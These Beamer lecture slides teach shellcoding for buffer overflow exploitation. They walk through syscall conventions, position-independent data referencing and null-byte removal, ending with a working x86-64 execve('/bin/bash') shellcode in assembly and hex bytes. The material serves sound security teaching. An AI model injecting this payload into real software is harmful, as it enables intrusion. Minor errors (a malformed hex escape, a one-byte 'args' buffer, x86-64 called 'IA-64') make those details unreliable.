\section{Shellcoding}
\begin{frame}[fragile]{Shellcoding}
	\begin{block}{BOF payload}
		\begin{itemize}
			\item A buffer overflow exploitation ends with the execution of an arbitrary payload.
			\item The payload is a sequence of machine code instructions.
			\item A common way to write shellcode is to use assembly language.
			\item Usually, the ultimate goal is to spawn a shell (hence \emph{shellcoding}):
		\end{itemize}
	\end{block}
	\ccode
	\begin{lstlisting}
		execve("/bin/bash", ["/bin/bash", NULL], NULL);
	\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Shellcoding: Creation steps}
	\begin{block}{Assuming direct control}
		\begin{enumerate}
			\item Invoke the execve syscall.
			\item Refer the string \emph{``/bin/bash''} and the argument array.
			\item Optimize the payload.
			\item Perform the buffer overflow.
		\end{enumerate}
	\end{block}
	\ccode
	\begin{lstlisting}
		execve("/bin/bash", ["/bin/bash", NULL], NULL);
	\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Shellcoding: Syscalls}
	\subsection{Syscalls}
	\begin{block}{Invoking a syscall}
		\begin{itemize}
			\item Syscalls are invokable using a numerical id.
			\item Ids are defined into \emph{unistd\_32.h} for x86 systems and \emph{unistd\_64.h} for x86\_64 systems.
			\item On x86\_64 systems the assembler operation \emph{syscall} execute the syscall identified by \emph{rax}.
			\item On x86 systems the assembler operation \emph{int 80h} raises a software interrupt, which leads to the execution
				of the syscall identified by \emph{eax}.
		\end{itemize}
	\end{block}
	\acode
	\begin{columns}[T]
		\begin{column}{.4\textwidth}
			\begin{lstlisting}
				; exit(0) syscall
				mov rdi, 0
				mov rax, 60
				syscall
			\end{lstlisting}
		\end{column}
		\begin{column}{.4\textwidth}
			\begin{lstlisting}
				; exit(0) syscall
				mov ebx, 0
				mov eax, 1
				int 80h
			\end{lstlisting}
		\end{column}
	\end{columns}
\end{frame}

\begin{frame}[fragile,shrink]{Shellcoding: The execve syscall}
	\ccode
	\begin{lstlisting}
		unistd_32.h
		#define __NR_execve 11
		unistd_64.h
		#define __NR_execve 59
		syscall.h
		int kernel_execve( const char *filename,
		                   const char *const argv[],
		                   const char *const envp[]);
	\end{lstlisting}
	\begin{block}{man 2 execve}
		\begin{itemize}
			\item execve() executes  the  program  pointed to by filename.
			\item argv is an array of argument strings passed to the new program. By
				convention, the first of these  strings  should contain the filename.
			\item envp is an array of strings, conventionally of the form \emph{key=value}.
			\item Both argv and envp \textbf{must} be terminated by a NULL pointer.
			\item On Linux, argv [or envp] can be specified as NULL, which has the same effect as specifying  this  argument as a pointer to a list containing a single NULL pointer.
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}{Shellcoding: Syscall and parameter passing}
	\begin{block}{How to pass parameters?}
		\begin{itemize}
			\item Use the calling convention for syscalls!
				\begin{description}
					\item[x86\_64]rdi, rsi, rdx, r10, r8 and r9.
					\item[x86]ebx, ecx, edx, esi, edi and ebp.
				\end{description}
			\item Other parameters go into the stack.
			\item \emph{execve} parameters:
				\begin{description}
					\item[x86\_64] $rdi\implies "/bin/bash"$\\
						$rsi\implies ["/bin/bash", NULL]$\\
						$rdx\implies NULL$\\
					\item[x86]$ebx \implies "/bin/bash"$\\
						$ecx \implies ["/bin/bash", NULL]$\\
						$edx \implies NULL$
				\end{description}
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}[fragile,allowframebreaks]{Shellcoding: Data reference}
	\subsection{Data reference}
	\begin{block}{The reference problem}
		\begin{itemize}
			\item The shellcode must know the reference of \emph{``/bin/bash''}, argv and env.
			\item The shellcode is not compiled with the program it's intended to run: it must be designed as a \emph{Position Independent Code}, i.e. the shellcode can't use absolute reference.
			\item Therefore you must use relative addressing, but before IA-64 it was not possible.
		\end{itemize}
	\end{block}
	\acode
	\begin{lstlisting}
		filename db '/bin/bash',0
		; What will be the address of filename in any program?
		mov rdi, ?
	\end{lstlisting}

	\framebreak

	\begin{block}{Old IA-32 way}
		\begin{itemize}
			\item You use a trick: jmp just before the data location, then do a
				call.
			\item The call Instruction pushes the next instruction pointer onto the
				stack, which is equal to the \emph{``/bin/bash''} address.
		\end{itemize}
	\end{block}
	\acode
	\begin{lstlisting}
		jmp filename
		run:
		  pop ebx ; ebx now contains "/bin/bash" reference
		  ; ...
		filename:
		  call run
		  db '/bin/bash',0
	\end{lstlisting}
	\begin{block}{New IA-64 way}
		\begin{itemize}
			\item IA-64 introduces the RIP relative addressing.
			\item \emph{[rel filename]} becomes \emph{[rip + offset]}
		\end{itemize}
	\end{block}
	\acode
	\begin{lstlisting}
		lea rdi, [rel message] ; now rdi contains
		                       ; the string reference
		; ...

		filename db '/bin/bash',0
	\end{lstlisting}
	\begin{block}{Generic Way}
		\begin{itemize}
			\item You can push the string in hex format into the stack.
			\item The stack pointer is then the string reference.
		\end{itemize}
	\end{block}
	\acode
	\begin{lstlisting}
		push 0x00000068 ; 0x00, 'h'
		push 0x7361622f ; 'sab/'
		push 0x6e69622f ; 'nib/'
		mov ebx, esp ; now ebx contains the string reference
		; ...
	\end{lstlisting}
\end{frame}

\begin{frame}[fragile, allowframebreaks]{Shellcode: first attempt}
	\acode
	\begin{lstlisting}
		bits 64

		lea rdi, [rel filename] ; filename
		lea rsi, [rel args] ; argv
		mov rdx, 0 ; envp

		mov [rel args], rdi ; argv[0] <- filename
		mov [rel args+8], rdx ; argv[1] <- null

		mov rax, 59
		syscall

		filename db '/bin/bash',0
		args db 16
	\end{lstlisting}
	\begin{lstlisting}
		\x48\x8d\x3d\x21\x00\x00\x00\x48\x\x8d\x35\x24\x00\x00
		\x00\xba\x00\x00\x00\x00\x48\x89\x3d\x18\x00\x\x00\x00
		\x48\x89\x15\x19\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f
		\x05\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x01\x00
		\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00
	\end{lstlisting}
	\begin{itemize}
		\item \alert{Warning: zero-byte presence!}
		\item Often shellcode payload are red as string.
		\item C strings are null-terminated array of chars.
		\item The vulnerable program will process only the first five bytes!
	\end{itemize}
\end{frame}

\begin{frame}{Shellcode: Zero-bytes problem}
	\subsection{Zero-bytes problem}
	\begin{block}{Zero-bytes presence is caused by data and addresses}
		\begin{itemize}
			\item \emph{mov rax, 11h} is equivalent to \emph{mov rax, 0000000000000011h}.
			\item \emph{lea rax, [rel message]} is equivalent to \emph{lea rax, [rip + 0000\ldots{}xxh]}.
			\item \emph{execve}, for instance, requires a null terminated string and some null parameters.
		\end{itemize}
	\end{block}
	\begin{block}{Solutions}
		\begin{itemize}
			\item Use \emph{xor} operation to zero a register.
			\item Use smaller registers (e.g.: rax $\rightarrow$ eax $\rightarrow$ ax $\rightarrow$ [ah,al])
			\item Use \emph{add} operation: immediate operator is not expanded.
			\item Place non-null marker and substitute them inside the code.
			\item Make a relative reference offset negative.
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}[fragile, allowframebreaks]{Shellcode: second attempt}
	\acode
	\begin{lstlisting}
		bits 64
		jmp code
		filename db '/bin/bash','n' ; 'n' is the marker
		args db 16
		code:
		  lea rdi, [rel filename] ; negative offset
		  lea rsi, [rel args] ; negative offset
		  xor rdx, rdx ; zeros rdx
		  mov [rel filename+10], dl ; zeros the marker 
		  mov [rel args], rdi
		  mov [rel args+8], rdx
		  xor rax,rax ; zeros rax
		  mov al, 59 ; uses smaller register
		  syscall
	\end{lstlisting}
	\begin{lstlisting}
		\xeb\x0b\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x6e
		\x10\x48\x8d\x3d\xee\xff\xff\xff\x48\x8d\x35\xf1
		\xff\xff\xff\x48\x31\xd2\x88\x15\xe8\xff\xff\xff
		\x48\x89\x3d\xe1\xff\xff\xff\x48\x89\x15\xe2\xff
		\xff\xff\x48\x31\xc0\xb0\x3b\x0f\x05
	\end{lstlisting}
	\begin{itemize}
		\item Zero-bytes eliminated.
	\end{itemize}
\end{frame}
